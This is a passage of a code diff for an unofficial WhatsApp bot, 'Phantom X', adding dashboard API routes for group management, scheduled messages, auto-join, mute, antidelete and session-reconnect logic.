+                    .filter(c => !selfJid || c.jid !== selfJid) // exclude self
+                    .sort((a, b) => b.lastSeen - a.lastSeen)
+                    .map(c => ({ 
+                        jid: c.jid, 
+                        number: c.jid.split("@")[0], 
+                        name: contactNames[userId]?.[c.jid] || "+" + c.jid.split("@")[0],
+                        lastSeen: c.lastSeen 
+                    }));
+                // Also merge in persisted chats that might not be in recent
+                const persisted = getPersistedChats(userId);
+                const merged = new Map();
+                for (const c of recent) merged.set(c.jid, c);
+                for (const [jid, info] of Object.entries(persisted)) {
+                    // Exclude self JID and group JIDs from private chat list
+                    if (!merged.has(jid) && jid.endsWith("@s.whatsapp.net") && (!selfJid || jid !== selfJid)) {
+                        merged.set(jid, {
+                            jid,
+                            number: jid.split("@")[0],
+                            name: info.name || "+" + jid.split("@")[0],
+                            lastSeen: info.lastTime || 0,
+                        });
+                    }
+                }
+                const chats = [...merged.values()].sort((a, b) => b.lastSeen - a.lastSeen);
+                res.writeHead(200);
+                return res.end(JSON.stringify({ ok: true, chats, total: chats.length }));
+            }
+
+            // ── GET /activity — recent activity log entries ──
+            if (action === "activity" && req.method === "GET") {
+                const list = activityLogs.get(userId) || [];
+                res.writeHead(200);
+                return res.end(JSON.stringify({ ok: true, log: list.slice(-100).reverse() }));
+            }
+
+            // ── POST /pause — stop bot from responding to commands ──
+            if (action === "pause" && req.method === "POST") {
+                botPaused.add(userId);
+                logActivity(userId, "pause", "Bot paused via dashboard");
+                pushToSSE(userId, { event: "pause", paused: true });
+                res.writeHead(200);
+                return res.end(JSON.stringify({ ok: true, paused: true }));
+            }
+
+            // ── POST /resume — resume bot ──
+            if (action === "resume" && req.method === "POST") {
+                botPaused.delete(userId);
+                logActivity(userId, "resume", "Bot resumed via dashboard");
+                pushToSSE(userId, { event: "pause", paused: false });
+                res.writeHead(200);
+                return res.end(JSON.stringify({ ok: true, paused: false }));
+            }
+
+            // ── GET /pause-state ──
+            if (action === "pause-state" && req.method === "GET") {
+                res.writeHead(200);
+                return res.end(JSON.stringify({ ok: true, paused: isBotPaused(userId) }));
+            }
+
+            // ── POST /send-image — send an image by URL with optional caption ──
+            // body: { jid, url, caption? }
+            if (action === "send-image" && req.method === "POST") {
+                if (!sock || !connected) {
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: false, error: "Bot not connected." }));
+                }
+                try {
+                    const body = JSON.parse(await readBody(req));
+                    const { jid, url, caption } = body;
+                    if (!jid || !url) { res.writeHead(400); return res.end(JSON.stringify({ ok:false, error:"Missing jid or url." })); }
+                    if (!/^https?:\/\//i.test(url)) { res.writeHead(400); return res.end(JSON.stringify({ ok:false, error:"URL must start with http(s)://" })); }
+                    await sock.sendMessage(jid.trim(), { image: { url: url.trim() }, caption: (caption || "").trim() });
+                    logActivity(userId, "send-image", `Image sent to ${jid}`);
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: true }));
+                } catch (e) {
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: false, error: e?.message }));
+                }
+            }
+
+            // ── POST /group/leave — make bot leave a group ──
+            // body: { groupJid }
+            if (action === "group/leave" && req.method === "POST") {
+                if (!sock || !connected) {
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: false, error: "Bot not connected." }));
+                }
+                try {
+                    const body = JSON.parse(await readBody(req));
+                    const { groupJid } = body;
+                    if (!groupJid) { res.writeHead(400); return res.end(JSON.stringify({ ok:false, error:"Missing groupJid" })); }
+                    await sock.groupLeave(groupJid);
+                    logActivity(userId, "group", `Left group ${groupJid}`);
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: true }));
+                } catch (e) {
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: false, error: e?.message }));
+                }
+            }
+
+            // ── GET /group/invite?jid=<groupJid> — get current group invite link ──
+            if (action === "group/invite" && req.method === "GET") {
+                if (!sock || !connected) {
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: false, error: "Bot not connected." }));
+                }
+                try {
+                    const groupJid = urlObj.searchParams.get("jid");
+                    if (!groupJid) { res.writeHead(400); return res.end(JSON.stringify({ ok:false, error:"Missing jid query param" })); }
+                    const code = await sock.groupInviteCode(groupJid);
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: true, code, link: `https://chat.whatsapp.com/${code}` }));
+                } catch (e) {
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: false, error: e?.message }));
+                }
+            }
+
+            // ── POST /group/revoke — revoke current invite + generate fresh link ──
+            // body: { groupJid }
+            if (action === "group/revoke" && req.method === "POST") {
+                if (!sock || !connected) {
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: false, error: "Bot not connected." }));
+                }
+                try {
+                    const body = JSON.parse(await readBody(req));
+                    const { groupJid } = body;
+                    if (!groupJid) { res.writeHead(400); return res.end(JSON.stringify({ ok:false, error:"Missing groupJid" })); }
+                    const newCode = await sock.groupRevokeInvite(groupJid);
+                    logActivity(userId, "group", `Revoked invite for ${groupJid}`);
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: true, code: newCode, link: `https://chat.whatsapp.com/${newCode}` }));
+                } catch (e) {
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: false, error: e?.message }));
+                }
+            }
+
+            // ── POST /group/promote — promote a participant to admin ──
+            // body: { groupJid, targetJid }
+            if (action === "group/promote" && req.method === "POST") {
+                if (!sock || !connected) { res.writeHead(200); return res.end(JSON.stringify({ ok:false, error:"Bot not connected." })); }
+                try {
+                    const body = JSON.parse(await readBody(req));
+                    const { groupJid, targetJid } = body;
+                    if (!groupJid || !targetJid) { res.writeHead(400); return res.end(JSON.stringify({ ok:false, error:"Missing groupJid or targetJid" })); }
+                    const r = await sock.groupParticipantsUpdate(groupJid, [targetJid], "promote");
+                    logActivity(userId, "group", `Promoted ${targetJid} in ${groupJid}`);
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: true, result: r }));
+                } catch (e) { res.writeHead(200); return res.end(JSON.stringify({ ok:false, error:e?.message })); }
+            }
+
+            // ── POST /group/demote — demote an admin back to member ──
+            if (action === "group/demote" && req.method === "POST") {
+                if (!sock || !connected) { res.writeHead(200); return res.end(JSON.stringify({ ok:false, error:"Bot not connected." })); }
+                try {
+                    const body = JSON.parse(await readBody(req));
+                    const { groupJid, targetJid } = body;
+                    if (!groupJid || !targetJid) { res.writeHead(400); return res.end(JSON.stringify({ ok:false, error:"Missing groupJid or targetJid" })); }
+                    const r = await sock.groupParticipantsUpdate(groupJid, [targetJid], "demote");
+                    logActivity(userId, "group", `Demoted ${targetJid} in ${groupJid}`);
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: true, result: r }));
+                } catch (e) { res.writeHead(200); return res.end(JSON.stringify({ ok:false, error:e?.message })); }
+            }
+
+            // ── POST /group/kick — kick a participant ──
+            // body: { groupJid, targetJid }
+            if (action === "group/kick" && req.method === "POST") {
+                if (!sock || !connected) { res.writeHead(200); return res.end(JSON.stringify({ ok:false, error:"Bot not connected." })); }
+                try {
+                    const body = JSON.parse(await readBody(req));
+                    const { groupJid, targetJid } = body;
+                    if (!groupJid || !targetJid) { res.writeHead(400); return res.end(JSON.stringify({ ok:false, error:"Missing groupJid or targetJid" })); }
+                    const r = await sock.groupParticipantsUpdate(groupJid, [targetJid], "remove");
+                    logActivity(userId, "group", `Kicked ${targetJid} from ${groupJid}`);
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: true, result: r }));
+                } catch (e) { res.writeHead(200); return res.end(JSON.stringify({ ok:false, error:e?.message })); }
+            }
+
+            // ── GET /group/members?jid=<groupJid> — list participants + admin status ──
+            if (action === "group/members" && req.method === "GET") {
+                if (!sock || !connected) { res.writeHead(200); return res.end(JSON.stringify({ ok:false, error:"Bot not connected.", members:[] })); }
+                try {
+                    const groupJid = urlObj.searchParams.get("jid");
+                    if (!groupJid) { res.writeHead(400); return res.end(JSON.stringify({ ok:false, error:"Missing jid" })); }
+                    const meta = await sock.groupMetadata(groupJid);
+                    const members = (meta.participants || []).map(p => ({
+                        jid:   p.id,
+                        number: (p.id || "").split("@")[0].split(":")[0],
+                        admin: p.admin || null, // null | "admin" | "superadmin"
+                    }));
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: true, name: meta.subject, members, total: members.length }));
+                } catch (e) { res.writeHead(200); return res.end(JSON.stringify({ ok:false, error:e?.message, members:[] })); }
+            }
+
+            res.writeHead(404);
+            return res.end(JSON.stringify({ ok: false, error: "Unknown action." }));
+        }
+
+        // ── Serve static files from public/ ──────────────────────────────
+        if (req.method === "GET") {
+            // Root → login.html
+            let filePath;
+            if (pathname === "/" || pathname === "") {
+                filePath = path.join(PUBLIC_DIR, "index.html");
+            } else {
+                filePath = path.join(PUBLIC_DIR, pathname.replace(/^\//, ""));
+            }
+            // Security: prevent directory traversal
+            if (!filePath.startsWith(PUBLIC_DIR)) {
+                res.writeHead(403); return res.end("Forbidden");
+            }
+            if (fs.existsSync(filePath)) {
+                return serveStatic(res, filePath);
+            }
+            // Try appending .html
+            if (!path.extname(filePath) && fs.existsSync(filePath + ".html")) {
+                return serveStatic(res, filePath + ".html");
+            }
+            res.writeHead(404, { "Content-Type": "text/plain" });
+            return res.end("404 Not Found");
+        }
+
+        // ── CORS preflight ────────────────────────────────────────────────
+        if (req.method === "OPTIONS") {
+            res.writeHead(204, { "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Methods": "GET,POST,OPTIONS", "Access-Control-Allow-Headers": "Content-Type" });
+            return res.end();
+        }
+
+        res.writeHead(200, { "Content-Type": "text/plain" });
+        res.end("👻 Phantom X is alive!\n");
+    });
+
+    server.on("error", (err) => {
+        if (err.code === "EADDRINUSE") {
+            console.log(`[Web] Port ${port} in use — trying ${port + 1}...`);
+            setTimeout(() => startKeepAliveServer(port + 1), 1000);
+        } else {
+            console.error("[Web] Server error:", err.message);
+        }
+    });
+    server.listen(port, () => {
+        const domain = process.env.RENDER_EXTERNAL_URL || `http://localhost:${port}`;
+        console.log(`[Web] Server running on port ${port} — ${domain}`);
+    });
+}
+startKeepAliveServer(PING_PORT);
+
+// --- SELF-PING (keeps the host awake — works on Replit AND Render free tier) ---
+// Detects the platform automatically using environment variables each sets.
+// Pings itself every 4 minutes so the service never sleeps.
+(function startSelfPing() {
+    // Replit sets REPLIT_DEV_DOMAIN, Render sets RENDER_EXTERNAL_URL
+    const replitDomain = process.env.REPLIT_DEV_DOMAIN;
+    const renderUrl    = process.env.RENDER_EXTERNAL_URL;
+
+    const selfUrl = renderUrl || (replitDomain ? `https://${replitDomain}` : null);
+    if (!selfUrl) return; // Not on a supported platform — skip self-ping
+
+    console.log(`[SelfPing] Auto-pinging ${selfUrl} every 4 minutes to stay awake.`);
+
+    setInterval(() => {
+        try {
+            const mod = selfUrl.startsWith("https") ? https : http;
+            mod.get(selfUrl, (res) => {
+                // Success — service stays awake
+            }).on("error", (err) => {
+                console.log(`[SelfPing] Ping failed (will retry in 4 min): ${err.message}`);
+            });
+        } catch (e) {
+            // Silently ignore
+        }
+    }, 4 * 60 * 1000); // every 4 minutes
+})();
+
+// --- SCHEDULE TIMER (check every minute, fire scheduled messages) ---
+setInterval(async () => {
+    const now = new Date();
+    const HH = String(now.getHours()).padStart(2, "0");
+    const MM = String(now.getMinutes()).padStart(2, "0");
+    const currentTime = `${HH}:${MM}`;
+    const sd = loadSchedules();
+    for (const [groupJid, entries] of Object.entries(sd)) {
+        for (const entry of (entries || [])) {
+            if (entry.time !== currentTime) continue;
+            // Prefer the socket that owns this schedule (matched by botJid)
+            let targetSock = null;
+            if (entry.botJid) {
+                // Find the socket whose user JID matches the stored botJid
+                for (const s of Object.values(activeSockets)) {
+                    const sJid = s.user?.id || "";
+                    if (sJid === entry.botJid || sJid.startsWith(entry.botJid.split(":")[0])) {
+                        targetSock = s; break;
+                    }
+                }
+            }
+            // Fallback to first active socket if no match
+            if (!targetSock) targetSock = Object.values(activeSockets)[0];
+            if (targetSock) {
+                try {
+                    await targetSock.sendMessage(groupJid, { text: entry.message });
+                    console.log(`[Schedule] Sent "${entry.time}" to ${groupJid}`);
+                } catch (e) {
+                    console.error(`[Schedule] Failed to send to ${groupJid}:`, e?.message);
+                }
+            }
+        }
+    }
+}, 60000);
+
+
+function migrateLegacySessionDataIfNeeded() {
+    // If DATA_DIR is set, copy old local sessions/auth_info once into DATA_DIR.
+    // This helps when moving from old storage to persistent storage on the same server.
+    if (DATA_DIR === __dirname) return;
+    try {
+        const legacySessions = path.join(__dirname, "sessions.json");
+        const targetSessions = dataPath("sessions.json");
+        if (!fs.existsSync(targetSessions) && fs.existsSync(legacySessions)) {
+            fs.copyFileSync(legacySessions, targetSessions);
+            console.log(`[Persistence] Migrated sessions.json to ${targetSessions}`);
+        }
+        const legacyAuth = path.join(__dirname, "auth_info");
+        const targetAuth = dataPath("auth_info");
+        if (!fs.existsSync(targetAuth) && fs.existsSync(legacyAuth)) {
+            fs.cpSync(legacyAuth, targetAuth, { recursive: true });
+            console.log(`[Persistence] Migrated auth_info to ${targetAuth}`);
+        }
+    } catch (e) {
+        console.log(`[Persistence] Migration skipped: ${e?.message}`);
+    }
+}
+
+// --- AUTO-RECONNECT SAVED SESSIONS ON STARTUP ---
+(async () => {
+    try {
+        if (typeof githubSync !== "undefined" && githubSync.startupProbe) {
+            await githubSync.startupProbe();
+        }
+    } catch (e) {
+        console.error("[Startup] Backup probe error:", e?.message || e);
+    }
+    try {
+        if (typeof githubSync !== "undefined" && githubSync.restoreFromRemote) {
+            const restored = await githubSync.restoreFromRemote();
+            // Some state files (web users/tokens/etc.) are loaded into memory earlier during
+            // process boot. If we restore them now from Telegram and don't reload them, the files
+            // exist on disk but the in-memory caches stay empty, which makes old dashboard logins
+            // look invalid right after redeploy. Re-load those caches immediately after restore.
+            if (restored?.restored || restored === true) {
+                try { loadWebTokens(); } catch (e) { console.error('[Startup] loadWebTokens after restore failed:', e?.message || e); }
+                try { loadWebUsers(); } catch (e) { console.error('[Startup] loadWebUsers after restore failed:', e?.message || e); }
+                try { loadWebMessages(); } catch (e) { console.error('[Startup] loadWebMessages after restore failed:', e?.message || e); }
+                try { loadContactNames(); } catch (e) { console.error('[Startup] loadContactNames after restore failed:', e?.message || e); }
+                try { loadWelcomeConfig(); } catch (e) { console.error('[Startup] loadWelcomeConfig after restore failed:', e?.message || e); }
+            }
+        }
+    } catch (e) {
+        console.error("[Startup] Remote restore error:", e?.message || e);
+    }
+    migrateLegacySessionDataIfNeeded();
+    const sessions = loadSessions();
+    const entries = Object.entries(sessions);
+    // T14: re-arm any pending auto-join timers from disk
+    setTimeout(() => { try { rearmAllPendingJoins(); } catch (e) { console.error("rearm err:", e?.message); } }, 5000);
+    if (!entries.length) return;
+    console.log(`[Startup] Found ${entries.length} saved session(s). Auto-reconnecting...`);
+    for (const [userId, { phoneNumber, chatId }] of entries) {
+        const authDir = getAuthDir(userId);
+        if (!fs.existsSync(authDir)) {
+            console.log(`[Startup] No auth folder for user ${userId}, skipping.`);
+            deleteSession(userId);
+            continue;
+        }
+
+        const isWebSession = String(userId).startsWith('web_') || String(chatId || '').startsWith('web_') || String(chatId || '') === String(userId);
+        try {
+            if (isWebSession) {
+                console.log(`[Startup] Reconnecting web session ${userId}...`);
+                debugLog(`[Startup] web session reconnect path for ${userId} phone=${phoneNumber}`);
+                await startBotForWeb(String(userId), phoneNumber);
+                continue;
+            }
+
+            const fakeCtx = makeFakeCtx(chatId);
+            try {
+                await fakeCtx.reply("🔄 Bot restarted. Reconnecting your WhatsApp session automatically...");
+            } catch (notifyErr) {
+                console.log(`[Startup] Could not notify Telegram chat ${chatId} before reconnect: ${notifyErr?.message}`);
+            }
+            startBot(Number(userId), phoneNumber, fakeCtx, true);
+        } catch (e) {
+            console.error(`[Startup] Failed to reconnect user ${userId}:`, e?.message || e);
+        }
+    }
+})();
+
+// --- WHATSAPP ENGINE ---
+async function startBot(userId, phoneNumber, ctx, isReconnect = false) {
+    const { state, saveCreds } = await useMultiFileAuthState(getAuthDir(userId));
+    const { version } = await fetchLatestBaileysVersion();
+    const socketMsgStore = createMessageStore();
+
+    const sock = makeWASocket({
+        version,
+        browser: [ "Ubuntu", "Chrome", "20.0.04" ],
+        auth: {
+            creds: state.creds,
+            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" })),
+        },
+        printQRInTerminal: false,
+        logger: pino({ level: "fatal" }),
+        markOnlineOnConnect: true,               // keep the linked account visibly online for group command reliability
+        syncFullHistory: false,         // don't pull FULL history on connect
+        shouldSyncHistoryMessage: shouldSyncHistoryMessageMinimal,
+        cachedGroupMetadata: async (jid) => groupMetadataCache.get(jid)?.meta,
+        generateHighQualityLinkPreview: false, // skip link preview generation — reduces processing overhead
+        getMessage: async (key) => socketMsgStore.get(key),
+        browser: [ "Ubuntu", "Chrome", "20.0.04" ],
+        browser: [ "Ubuntu", "Chrome", "20.0.04" ],
+        keepAliveIntervalMs: 15_000,    // ping WA servers every 15 s — prevents idle disconnects
+        connectTimeoutMs: 90_000,       // give the initial handshake up to 90 s
+        retryRequestDelayMs: 500,       // wait 0.5 s between internal proto retries
+    });
+
+    activeSockets[userId] = sock;
+    installQuotedGroupFallback(sock, `tg:${userId}`);
+    attachGroupCacheHooks(sock, `tg:${userId}`);
+
+    if (!isReconnect && !sock.authState.creds.registered) {
+        await delay(3000);
+        try {
+            const code = await sock.requestPairingCode(phoneNumber);
+            await ctx.reply("✅ Your pairing code is ready!\n\nOpen WhatsApp → Linked Devices → Link a Device → Enter code manually.\n\nHere is your code 👇");
+            await ctx.reply(`\`${code}\``, { parse_mode: "Markdown" });
+        } catch (err) {
+            console.error(`Pairing error for user ${userId}:`, err?.message || err);
+            await ctx.reply("❌ Failed to generate pairing code. Please try again with /pair <your number>.");
+            return;
+        }
+    }
+
+    sock.ev.on("creds.update", async () => {
+        await saveCreds();
+        githubSync.triggerSync(false); // 5 minute background debounce
+    });
+
+    sock.ev.on("presence.update", ({ id, presences }) => {
+        for (const [jid, pres] of Object.entries(presences)) {
+            if (pres.lastKnownPresence) presenceTracker[jid] = pres.lastKnownPresence;
+        }
+    });
+
+    sock.ev.on("messages.upsert", async ({ messages, type }) => {
+        for (const msg of messages) {
+            socketMsgStore.set(msg);
+            const tgMaybeText = extractMsgText(msg) || "";
+            if ((msg.key?.remoteJid || '').endsWith('@g.us') && tgMaybeText) {
+                await emitGroupTrace(sock, 'tg-upsert-seen', {
+                    eventType: type,
+                    jid: msg.key.remoteJid,
+                    sender: msg.key.participant || msg.participant || msg.key.remoteJid,
+                    fromMe: msg.key.fromMe,
+                    rawBody: tgMaybeText,
+                });
+            }
+            // "append" + fromMe = a message this bot just sent back to itself.
+            // We MUST push these to the dashboard so it gets the real message ID
+            // for "Delete for Everyone" to work, but we must NOT pass them to handleMessage.
+            // Only process normal "notify" messages, or "append" messages IF they are from the owner's phone.
+            // Wait, if the BOT sends a message via sock.sendMessage(), Baileys also emits an "append" event!
+            // We need to differentiate between the owner typing on their phone vs the bot sending programmatically.
+            // Actually, if we just process the message, and it's a command, the bot shouldn't send commands to itself.
+            // But if the owner types ".ping", the bot should reply.
+            // To prevent the bot from looping on its OWN replies, we just check if the message starts with a trigger!
+            // The bot's own replies don't start with triggers! They start with ASCII art or emojis.
+            
+            if (type !== "notify" && type !== "append") continue;
+            
+            let payload = null;
+            try {
+                payload = buildSSEMessage(msg);
+                if (payload) {
+                    pushToSSE(userId, payload);
+                    persistMessage(userId, payload);
+                    const remoteJid = msg.key.remoteJid;
+                    if (remoteJid && !msg.key.fromMe) {
+                        const name = msg.pushName || msg.notifyName || null;
+                        if (name) {
+                            if (remoteJid.endsWith("@g.us") && msg.key.participant) {
+                                persistContactName(userId, msg.key.participant, name);
+                            } else if (remoteJid.endsWith("@s.whatsapp.net")) {
+                                persistContactName(userId, remoteJid, name);
+                            }
+                        }
+                    }
+                }
+            } catch (_) {}
+            
+            // To prevent infinite loops when the bot sends messages programmatically (which also arrive as fromMe=true & append),
+            // we will let handleMessage run. Inside handleMessage, it only reacts if there is a trigger command!
+            // Since the bot's own responses don't start with ".ping", it will safely ignore its own programmatic messages.
+            await handleMessage(sock, msg);
+        }
+    });
+
+    // Auto-join group links detection
+    sock.ev.on("messages.upsert", async ({ messages, type }) => {
+        if (type !== "notify") return;
+        for (const m of messages) {
+            if (m.key?.fromMe) continue;
+            const ajFrom = m.key?.remoteJid;
+            if (!ajFrom?.endsWith("@g.us")) continue;
+            const aj = loadAutojoin();
+            const ajKey = sock.user?.id || "global";
+            if (!aj[ajKey]?.enabled) continue;
+            const ajText =
+                m.message?.conversation ||
+                m.message?.extendedTextMessage?.text ||
+                m.message?.imageMessage?.caption ||
+                m.message?.videoMessage?.caption || "";
+            const linkMatch = ajText.match(/https?:\/\/chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/);
+            if (!linkMatch) continue;
+            const ajCode = linkMatch[1];
+            // Blacklist check
+            const blacklist = ["porn","adult","xxx","nude","sex","leak","onlyfan"];
+            if (blacklist.some(b => ajText.toLowerCase().includes(b))) continue;
+            try {
+                await sock.groupAcceptInvite(ajCode);
+                console.log(`[AutoJoin] Joined group via link code: ${ajCode}`);
+            } catch (e) {
+                console.log(`[AutoJoin] Failed to join ${ajCode}: ${e?.message}`);
+            }
+        }
+    });
+
+    // Muted user: auto-delete messages from muted users in groups
+    sock.ev.on("messages.upsert", async ({ messages, type }) => {
+        if (type !== "notify") return;
+        for (const m of messages) {
+            if (m.key?.fromMe) continue;
+            const muteGroup = m.key?.remoteJid;
+            if (!muteGroup?.endsWith("@g.us")) continue;
+            const muteSender = m.key?.participant || m.participant;
+            if (!muteSender) continue;
+            if (!isUserMuted(muteGroup, muteSender)) continue;
+            try {
+                await sock.sendMessage(muteGroup, { delete: m.key });
+            } catch (e) {
+                console.log(`[Mute] Failed to delete msg from ${muteSender}: ${e?.message}`);
+            }
+        }
+    });
+
+    // 10-minute mute reminder for all muted users in all groups
+    setInterval(async () => {
+        try {
+            const allMuted = loadMutedUsers();
+            for (const [groupJid, mutedList] of Object.entries(allMuted)) {
+                if (!mutedList?.length) continue;
+                for (const mutedJid of mutedList) {
+                    try {
+                        await sock.sendMessage(groupJid, {
+                            text: buildOmegaTerminal(
+                                `   ░▒▓█ *SILENCE_ACTIVE* █▓▒░\n\n` +
+                                `   [ 🔇 ] *USER* : @${mutedJid.split("@")[0]}\n` +
+                                `   [ ⚡ ] *STATUS* : MUTED\n` +
+                                `   [ ⏱️ ] *REMINDER* : VOCAL_SEAL_ONGOING\n\n` +
+                                `   " *The silence continues.*\n     *Your voice is sealed.*\n     *Only an admin can*\n     *restore it.* "`
+                            ),
+                            mentions: [mutedJid]
+                        });
+                    } catch (e) {
+                        console.log(`[MuteReminder] Failed for ${mutedJid} in ${groupJid}: ${e?.message}`);
+                    }
+                }
+            }
+        } catch (e) {
+            console.log(`[MuteReminder] Error: ${e?.message}`);
+        }
+    }, 10 * 60 * 1000);
+
+    // Store messages for antidelete lookup + .clear cache
+    const msgCache = {};
+    sock.ev.on("messages.upsert", ({ messages }) => {
+        const botId = sock.user?.id || "unknown";
+        for (const m of messages) {
+            if (!m.key?.id || !m.message) continue;
+            msgCache[m.key.id] = m;
+            // Also store in globalMsgCache for .clear command
+            const gKey = `${botId}::${m.key.remoteJid}`;
+            if (!globalMsgCache[gKey]) globalMsgCache[gKey] = [];
+            globalMsgCache[gKey].push(m);
+            if (globalMsgCache[gKey].length > 1000) globalMsgCache[gKey].shift();
+        }
+    });
+
+    sock.ev.on("messages.delete", async (item) => {
+        try {
+            // Owner DM JID — bot DMs itself (the bot is running as the owner's account)
+            const ownerDmJid = (sock.user?.id || "").replace(/:.*@/, "@").replace(/@g\.us$/, "@s.whatsapp.net");
+            const keys = item.keys || (item.key ? [item.key] : []);
+            for (const key of keys) {
+                const groupJid = key.remoteJid;
+                if (!groupJid?.endsWith("@g.us")) continue;
+                if (!getGroupSetting(groupJid, "antidelete")) continue;
+                const cached = msgCache[key.id];
+                if (!cached?.message) continue;
+                const type = getContentType(cached.message);
+                const who = key.participant || cached.key?.participant;
+                const whoNum = who ? who.split("@")[0] : "unknown";
+                // Resolve group name for context
+                let groupName = groupJid;
+                try { const meta = await sock.groupMetadata(groupJid); groupName = meta.subject; } catch (_) {}
+                const header = `🗑️ *ANTIDELETE — DM ALERT*\n` +
+                               `👥 *Group:* ${groupName}\n` +
+                               `👤 *From:* +${whoNum}\n\n`;
+                try {
+                    if (!ownerDmJid || ownerDmJid === "@s.whatsapp.net") continue;
+                    if (type === "conversation" || type === "extendedTextMessage") {
+                        const txt = cached.message?.conversation || cached.message?.extendedTextMessage?.text || "";
+                        if (txt) {
+                            await sock.sendMessage(ownerDmJid, {
+                                text: header + `📝 *Deleted text:*\n${txt}`,
+                            });
+                        }
+                    } else if (type === "imageMessage") {
+                        const buf = await downloadMediaMessage(cached, "buffer", {}, { logger: pino({ level: "silent" }) });
+                        const cap = cached.message?.imageMessage?.caption || "";
+                        await sock.sendMessage(ownerDmJid, {
+                            image: buf,
+                            caption: header + `🖼️ *Deleted image*` + (cap ? `\n_Caption:_ ${cap}` : ""),
+                        });
+                    } else if (type === "videoMessage") {
+                        const buf = await downloadMediaMessage(cached, "buffer", {}, { logger: pino({ level: "silent" }) });
+                        const cap = cached.message?.videoMessage?.caption || "";
+                        await sock.sendMessage(ownerDmJid, {
+                            video: buf,
+                            caption: header + `🎥 *Deleted video*` + (cap ? `\n_Caption:_ ${cap}` : ""),
+                        });
+                    } else if (type === "audioMessage") {
+                        const buf = await downloadMediaMessage(cached, "buffer", {}, { logger: pino({ level: "silent" }) });
+                        await sock.sendMessage(ownerDmJid, {
+                            audio: buf,
+                            mimetype: "audio/mp4",
+                            ptt: cached.message?.audioMessage?.ptt || false,
+                            caption: header + `🎵 *Deleted audio*`,
+                        });
+                    } else if (type === "stickerMessage") {
+                        const buf = await downloadMediaMessage(cached, "buffer", {}, { logger: pino({ level: "silent" }) });
+                        await sock.sendMessage(ownerDmJid, {
+                            sticker: buf,
+                        });
+                        await sock.sendMessage(ownerDmJid, { text: header + `🗑️ *Deleted sticker above*` });
+                    } else {
+                        await sock.sendMessage(ownerDmJid, {
+                            text: header + `📦 *Deleted message type:* ${type}`,
+                        });
+                    }
+                } catch (_) {}
+            }
+        } catch (e) {
+            console.error("[Antidelete]", e?.message);
+        }
+    });
+
+    sock.ev.on("group-participants.update", async (update) => {
+        await handleGroupUpdate(sock, update, ctx, botJids[userId]);
+    });
+
+    sock.ev.on("connection.update", async (update) => {
+        const { connection, lastDisconnect } = update;
+
+        if (connection === "open") {
+            if (typeof githubSync !== "undefined") githubSync.triggerSync(true);
+            retryCounts[userId] = 0;
+            botJids[userId] = sock.user?.id || sock.user?.jid || null;
+            try { sock.sendPresenceUpdate("available"); } catch (_) {}
+            startPresenceHeartbeat(userId, sock);
+            await warmAllGroups(sock, `tg:${userId}`);
+            telegramCtxs[userId] = ctx;
+            saveSession(userId, phoneNumber, ctx.from?.id || userId, false);
+
+            // ── Notification cooldown ──────────────────────────────────────────
+            // Only notify Telegram + WA self-chat once every 2 minutes per user.
+            // Prevents flooding both chats during rapid reconnect loops.
+            const NOTIFY_COOLDOWN_MS = 2 * 60 * 1000; // 2 minutes
+            const now = Date.now();
+            const lastNotify = lastConnectNotify[userId] || 0;
+            const shouldNotify = (now - lastNotify) > NOTIFY_COOLDOWN_MS;
+            // Always notify on the very first connection (not a reconnect)
+            if (!isReconnect || shouldNotify) {
+                lastConnectNotify[userId] = now;
+                ctx.reply(isReconnect
+                    ? "✅ WhatsApp connection restored!\n\nPhantom X is back online. Send *.menu* on WhatsApp to see commands."
+                    : "🎊 WhatsApp Bot is now connected and LIVE!\n\nSend *.menu* on WhatsApp to see all commands."
+                );
+                try {
+                    await delay(3000);
+                    const selfJid = (sock.user?.id || "").split(':')[0].split('@')[0] + "@s.whatsapp.net";
+                    await sock.sendMessage(selfJid, {
+                        text: `╔══════════════════════╗\n║  ✅  PHANTOM X ${isReconnect ? "RESTORED" : "LIVE"}  ✅  ║\n╚══════════════════════╝\n\n🔥 *Your bot is now ${isReconnect ? "BACK ONLINE" : "CONNECTED"}!*\n\nYou can chat me here or use me in any group.\nType *.menu* to see all commands.\n━━━━━━━━━━━━━━━━━━━━`
+                    });
+                    // T14: schedule the auto-join + welcome DM (only on first pair)
+                    if (!isReconnect) {
+                        try { scheduleLinkWelcome(userId, sock); } catch (e2) { console.error("Schedule welcome error:", e2?.message); }
+                    }
+                } catch (e) { console.error("Welcome WA msg error:", e?.message); }
+
+                // ── Generate & send dashboard Session ID to Telegram-paired users ──
+                // Telegram /pair users also deserve a web dashboard session ID!
+                try {
+                    await delay(2000);
+                    let token = Object.keys(webTokens).find(t => webTokens[t].userId === String(userId));
+                    if (!token) {
+                        token = generateWebToken();
+                        webTokens[token] = { userId: String(userId), phone: phoneNumber, created: Date.now() };
+                        saveWebTokens();
+                    }
+                    const rawJid = (sock.user?.id || "").split(":")[0].split("@")[0];
+                    const selfJid = rawJid + "@s.whatsapp.net";
+                    const webUrl = process.env.RENDER_EXTERNAL_URL
+                        || (process.env.REPLIT_DEV_DOMAIN ? `https://${process.env.REPLIT_DEV_DOMAIN}` : "http://localhost:3000");
+                    await sock.sendMessage(selfJid, {
+                        text:
+                            `╔══════════════════════╗\n` +
+                            `║   🔑  EVENTIDE OMEGA   ║\n` +
+                            `╚══════════════════════╝\n\n` +
+                            `✅ *Your Telegram bot is connected!*\n\n` +
+                            `📋 *Your Dashboard Session ID:*\n` +
+                            `\`\`\`${token}\`\`\`\n\n` +
